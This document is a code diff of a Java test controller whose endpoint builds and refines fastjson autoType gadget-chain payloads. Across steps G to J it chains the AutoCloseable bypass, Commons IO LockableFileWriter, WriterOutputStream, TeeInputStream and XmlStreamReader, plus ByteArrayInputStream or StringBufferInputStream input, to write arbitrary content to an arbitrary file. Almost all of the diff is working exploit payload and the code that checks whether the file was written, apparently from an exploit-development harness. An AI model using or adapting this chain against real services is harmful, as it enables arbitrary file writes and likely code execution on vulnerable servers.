@@ -1,6 +1,7 @@
 package com.test;
 
 import com.alibaba.fastjson.JSONObject;
+import com.alibaba.fastjson.parser.Feature;
 import com.alibaba.fastjson.parser.ParserConfig;
 import com.auth0.jwt.JWT;
 import com.auth0.jwt.interfaces.DecodedJWT;
@@ -64,8 +65,6 @@ public class App {
             r.put("ok", true);
         } catch (Exception e) {
             log.error("[RAW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
-            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
-            log.error("[RAW-STACK] {}", sw);
             r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
         }
         return r;
@@ -94,8 +93,11 @@ public class App {
     }
 
     /**
-     * step=G  注入 buf + count，验证 ByteArrayInputStream 可正常读取
-     * step=H  完整链 + buf+count 注入，验证文件写入
+     * step=G  验证 count 字段是否能被注入（SupportNonPublicField 模式）
+     * step=H  完整链，先用 SupportNonPublicField 注入 buf+count
+     * step=I  完全绕过 ByteArrayInputStream，改用 StringBufferInputStream
+     *         （JDK 废弃类，但仍存在，内部直接操作 String，无 count 问题）
+     * step=J  用 fastjson 创建 wos，Java 代码把 bais 数据手动泵入 wos（验证 wos 写入）
      */
     @PostMapping("/diag/step")
     public Map<String, Object> diagStep(@RequestBody Map<String, String> body) {
@@ -105,7 +107,6 @@ public class App {
         Map<String, Object> r = new LinkedHashMap<>();
 
         byte[] contentBytes = content.getBytes(StandardCharsets.ISO_8859_1);
-        // 使用实际内容长度，不填充，count = contentBytes.length
         String b64Content = Base64.getEncoder().encodeToString(contentBytes);
         int byteLen = contentBytes.length;
         String escapedFile = file.replace("\\", "\\\\").replace("\"", "\\\"");
@@ -114,71 +115,54 @@ public class App {
             switch (step) {
 
                 case "G": {
-                    // 关键修复：同时注入 buf 和 count
-                    // ByteArrayInputStream.read() 判断 pos < count，count=0 则立即返回 -1
-                    // fastjson 反射只注入 buf，count 保持 0
-                    // 解决方案：在 JSON 中额外注入 count 字段
-                    String json = "{\"@type\":\"java.lang.AutoCloseable\","
-                            + "\"@type\":\"java.io.ByteArrayInputStream\","
+                    // 用 SupportNonPublicField 注入 protected 的 count 字段
+                    String json = "{\"@type\":\"java.io.ByteArrayInputStream\","
                             + "\"buf\":\"" + b64Content + "\","
                             + "\"count\":" + byteLen + "}";
-
                     log.info("[STEP-G] json={}", json);
-                    Object result = JSONObject.parseObject(json);
-                    log.info("[STEP-G] parseObject OK, type={}", result == null ? "null" : result.getClass().getName());
-
-                    if (result instanceof ByteArrayInputStream) {
-                        ByteArrayInputStream bais = (ByteArrayInputStream) result;
-                        // 反射检查 count
-                        Field countField = ByteArrayInputStream.class.getDeclaredField("count");
-                        countField.setAccessible(true);
-                        int countVal = (int) countField.get(bais);
-                        Field posField = ByteArrayInputStream.class.getDeclaredField("pos");
-                        posField.setAccessible(true);
-                        int posVal = (int) posField.get(bais);
-                        log.info("[STEP-G] bais.count={} bais.pos={}", countVal, posVal);
-                        r.put("count", countVal);
-                        r.put("pos", posVal);
-
-                        // 尝试读取
-                        byte[] buf = new byte[1024];
+                    // SupportNonPublicField 允许注入 protected/private 字段
+                    Object obj = JSONObject.parseObject(json, Object.class, Feature.SupportNonPublicField);
+                    log.info("[STEP-G] type={}", obj == null ? "null" : obj.getClass().getName());
+                    if (obj instanceof ByteArrayInputStream) {
+                        ByteArrayInputStream bais = (ByteArrayInputStream) obj;
+                        Field cf = ByteArrayInputStream.class.getDeclaredField("count");
+                        cf.setAccessible(true);
+                        log.info("[STEP-G] count={}", cf.get(bais));
+                        byte[] buf = new byte[256];
                         int n = bais.read(buf);
-                        log.info("[STEP-G] read {} bytes: {}", n, n > 0 ? new String(buf, 0, Math.min(n, 20)) : "(none)");
+                        log.info("[STEP-G] read={} preview={}", n,
+                                n > 0 ? new String(buf, 0, Math.min(n, 20)) : "(none)");
+                        r.put("count", cf.get(bais));
                         r.put("readBytes", n);
-                        r.put("readPreview", n > 0 ? new String(buf, 0, Math.min(n, 20)) : "(none)");
-                    } else {
-                        log.info("[STEP-G] result is not ByteArrayInputStream but {}", result == null ? "null" : result.getClass());
-                        r.put("resultType", result == null ? "null" : result.getClass().getSimpleName());
+                        r.put("preview", n > 0 ? new String(buf, 0, Math.min(n, 20)) : "(none)");
                     }
                     r.put("ok", true);
+                    r.put("type", obj == null ? "null" : obj.getClass().getSimpleName());
                     break;
                 }
 
                 case "H": {
-                    // 完整链，buf + count 同时注入
+                    // 完整链 + SupportNonPublicField
+                    // 注意：JSONObject.parseObject(json) 不支持 Feature，
+                    // 但 JSON.parse(json, Feature) 可以。
+                    // 换成 JSON.parseObject(json, JSONObject.class, Feature.SupportNonPublicField)
                     String json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
-                            // LockableFileWriter
                             + "\"lfw\":{\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                             + "\"file\":\"" + escapedFile + "\","
                             + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
-                            // WriterOutputStream → lfw
                             + "\"wos\":{\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                             + "\"writer\":{\"$ref\":\"$.lfw\"},"
                             + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
-                            // ByteArrayInputStream，buf + count 同时注入
-                            + "\"bais\":{\"@type\":\"java.lang.AutoCloseable\","
-                            + "\"@type\":\"java.io.ByteArrayInputStream\","
+                            + "\"bais\":{\"@type\":\"java.io.ByteArrayInputStream\","
                             + "\"buf\":\"" + b64Content + "\","
                             + "\"count\":" + byteLen + "},"
-                            // TeeInputStream：bais → wos
                             + "\"tee\":{\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
                             + "\"input\":{\"$ref\":\"$.bais\"},"
                             + "\"branch\":{\"$ref\":\"$.wos\"},"
                             + "\"closeBranch\":true},"
-                            // XmlStreamReader：构造时读 tee，驱动数据流
                             + "\"xml\":{\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.XmlStreamReader\","
                             + "\"is\":{\"$ref\":\"$.tee\"},"
@@ -186,11 +170,11 @@ public class App {
                             + "\"lenient\":true,"
                             + "\"defaultEncoding\":\"iso-8859-1\"}"
                             + "}";
-
                     log.info("[STEP-H] json len={}", json.length());
-                    JSONObject result = JSONObject.parseObject(json);
-                    log.info("[STEP-H] parseObject OK, keys={}", result == null ? "null" : result.keySet());
-
+                    com.alibaba.fastjson.JSONObject result =
+                            com.alibaba.fastjson.JSON.parseObject(json, com.alibaba.fastjson.JSONObject.class,
+                                    Feature.SupportNonPublicField);
+                    log.info("[STEP-H] OK keys={}", result == null ? "null" : result.keySet());
                     File f = new File(file);
                     log.info("[STEP-H] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
                     r.put("fileExists", f.exists());
@@ -199,8 +183,105 @@ public class App {
                     break;
                 }
 
+                case "I": {
+                    // 改用 StringBufferInputStream（JDK 废弃类，read() 从 String 读，无 count 问题）
+                    // 内部直接 return buffer.charAt(pos++) & 0xFF，不依赖 count 字段
+                    String json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
+                            + "\"lfw\":{\"@type\":\"java.lang.AutoCloseable\","
+                            + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
+                            + "\"file\":\"" + escapedFile + "\","
+                            + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
+                            + "\"wos\":{\"@type\":\"java.lang.AutoCloseable\","
+                            + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
+                            + "\"writer\":{\"$ref\":\"$.lfw\"},"
+                            + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
+                            // StringBufferInputStream(String s) - 构造参数名 "s"，有参数名
+                            + "\"sbis\":{\"@type\":\"java.lang.AutoCloseable\","
+                            + "\"@type\":\"java.io.StringBufferInputStream\","
+                            + "\"s\":\"" + content.replace("\\", "\\\\").replace("\"", "\\\"") + "\"},"
+                            + "\"tee\":{\"@type\":\"java.lang.AutoCloseable\","
+                            + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
+                            + "\"input\":{\"$ref\":\"$.sbis\"},"
+                            + "\"branch\":{\"$ref\":\"$.wos\"},"
+                            + "\"closeBranch\":true},"
+                            + "\"xml\":{\"@type\":\"java.lang.AutoCloseable\","
+                            + "\"@type\":\"org.apache.commons.io.input.XmlStreamReader\","
+                            + "\"is\":{\"$ref\":\"$.tee\"},"
+                            + "\"httpContentType\":\"text/xml\","
+                            + "\"lenient\":true,"
+                            + "\"defaultEncoding\":\"iso-8859-1\"}"
+                            + "}";
+                    log.info("[STEP-I] json len={}", json.length());
+                    JSONObject result = JSONObject.parseObject(json);
+                    log.info("[STEP-I] OK keys={}", result == null ? "null" : result.keySet());
+                    File f = new File(file);
+                    log.info("[STEP-I] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
+                    r.put("fileExists", f.exists());
+                    r.put("fileSize", f.exists() ? f.length() : -1);
+                    r.put("ok", true);
+                    break;
+                }
+
+                case "J": {
+                    // fastjson 创建 wos，Java 从 bais 手动泵入数据到 wos
+                    // 验证：wos 本身是否可以正确写入（上次 step=E 已确认）
+                    // 这次验证 bais(buf+count) 是否可读
+                    String json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
+                            + "\"lfw\":{\"@type\":\"java.lang.AutoCloseable\","
+                            + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
+                            + "\"file\":\"" + escapedFile + "\","
+                            + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
+                            + "\"wos\":{\"@type\":\"java.lang.AutoCloseable\","
+                            + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
+                            + "\"writer\":{\"$ref\":\"$.lfw\"},"
+                            + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
+                            + "\"bais\":{\"@type\":\"java.io.ByteArrayInputStream\","
+                            + "\"buf\":\"" + b64Content + "\","
+                            + "\"count\":" + byteLen + "}"
+                            + "}";
+                    com.alibaba.fastjson.JSONObject result =
+                            com.alibaba.fastjson.JSON.parseObject(json, com.alibaba.fastjson.JSONObject.class,
+                                    Feature.SupportNonPublicField);
+                    log.info("[STEP-J] OK keys={}", result == null ? "null" : result.keySet());
+
+                    Object wosObj = result.get("wos");
+                    Object baisObj = result.get("bais");
+                    log.info("[STEP-J] wos={} bais={}", wosObj == null ? "null" : wosObj.getClass().getName(),
+                            baisObj == null ? "null" : baisObj.getClass().getName());
+
+                    if (baisObj instanceof ByteArrayInputStream) {
+                        ByteArrayInputStream bais = (ByteArrayInputStream) baisObj;
+                        Field cf = ByteArrayInputStream.class.getDeclaredField("count");
+                        cf.setAccessible(true);
+                        log.info("[STEP-J] bais.count={}", cf.get(bais));
+                        // 手动读一个字节看 count 是否有效
+                        int firstByte = bais.read();
+                        log.info("[STEP-J] bais.read()={}", firstByte);
+                    }
+                    if (wosObj instanceof WriterOutputStream && baisObj instanceof ByteArrayInputStream) {
+                        WriterOutputStream wos = (WriterOutputStream) wosObj;
+                        ByteArrayInputStream bais = (ByteArrayInputStream) baisObj;
+                        // 重置 bais 到开头
+                        bais.reset();
+                        byte[] buf = new byte[4096];
+                        int n, total = 0;
+                        while ((n = bais.read(buf)) != -1) {
+                            wos.write(buf, 0, n);
+                            total += n;
+                        }
+                        wos.flush(); wos.close();
+                        log.info("[STEP-J] pumped {} bytes", total);
+                    }
+                    File f = new File(file);
+                    log.info("[STEP-J] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
+                    r.put("fileExists", f.exists());
+                    r.put("fileSize", f.exists() ? f.length() : -1);
+                    r.put("ok", true);
+                    break;
+                }
+
                 default:
-                    r.put("ok", false); r.put("msg", "step must be G or H"); return r;
+                    r.put("ok", false); r.put("msg", "step must be G/H/I/J"); return r;
             }
 
         } catch (Exception e) {
